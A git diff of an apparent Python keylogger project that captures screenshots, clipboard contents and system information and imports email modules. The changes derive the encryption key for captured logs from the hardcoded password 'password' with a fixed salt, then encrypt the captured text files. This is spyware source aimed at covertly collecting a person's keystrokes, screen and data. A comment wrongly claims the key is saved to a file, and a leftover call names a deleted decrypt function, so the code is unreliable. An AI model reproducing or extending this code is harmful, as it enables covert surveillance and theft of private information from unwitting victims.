@@ -14,6 +14,10 @@ from email import encoders
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 from cryptography.fernet import Fernet
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+import base64
 
 directory = "/out"
 log = "log.txt"
@@ -181,50 +185,37 @@ def log_clipboard():
 
 def take_screenshot(iteration_count):
     screenshot = ImageGrab.grab()
-    screenshot.show()
+    #screenshot.show()
     screenshot.save(f"out/screenshot{iteration_count}.png")
 
-def create_key():
-    key = Fernet.generate_key()
-    
-    with open("key.txt", "wb") as file:
-        file.write(key)
+# generates a key based off a chosen password and saves it to 'key.txt'
+def get_key():
+    password = "password".encode()
+    salt = b'\x89\x07\x06\xc6i\x99\xd2\x950\xb5Sje\xe4\xd9\xff'
 
-def read_key():
-    with open("key.txt", "rb") as file:
-        key = file.read()
+    kdf = PBKDF2HMAC(
+            algorithm = hashes.SHA256(),
+            length = 32,
+            salt = salt,
+            iterations = 10000,
+            backend = default_backend()
+    )
+    key = base64.urlsafe_b64encode(kdf.derive(password))
+
     return key
 
-def encrypt(key):
+def encrypt_files(key):
     dir = "/Users/ibrah/Documents/key-logger/out"
 
     # Loops through all files in /out and encrypt each file
     for filename in os.listdir(dir):
-        print(filename)
-
-    filename = "log.txt"
-    with open(os.path.join(dir, filename), "rb") as file:
-        data = file.read()
-    fernet = Fernet(key)
-    encrypted = fernet.encrypt(data)
-    with open(os.path.join(dir, filename), "wb") as file:
-        file.write(encrypted)
-
-def decrypt(key):
-    dir = "/Users/ibrah/Documents/key-logger/out"
-    for filename in os.listdir(dir):
         if filename.endswith('.txt'):
-            print(filename)
-
-    filename = "log.txt"
-    with open(os.path.join(dir, filename), "rb") as file:
-        data = file.read()
-        print(data)
-    fernet = Fernet(key)
-    decrypted = fernet.decrypt(data)
-    with open(os.path.join(dir, filename), "wb") as file:
-        file.write(decrypted)
-        print(decrypted)
+            with open(os.path.join(dir, filename), "rb") as file:
+                data = file.read()
+            fernet = Fernet(key)
+            encrypted = fernet.encrypt(data)
+            with open(os.path.join(dir, filename), "wb") as file:
+                file.write(encrypted)
 
 if __name__ == "__main__":
     iteration_count = 0
@@ -232,11 +223,9 @@ if __name__ == "__main__":
     init_log_file()
     log_sys_info()
 
-    #create_key()
-    key = read_key()
-    print(key)
-    encrypt(key)
-    #decrypt(key)
+    key = get_key()
+    encrypt_files(key)
+    #decrypt_files(key)
 
     current_time = time.time()
     stopping_time = current_time + time_interval
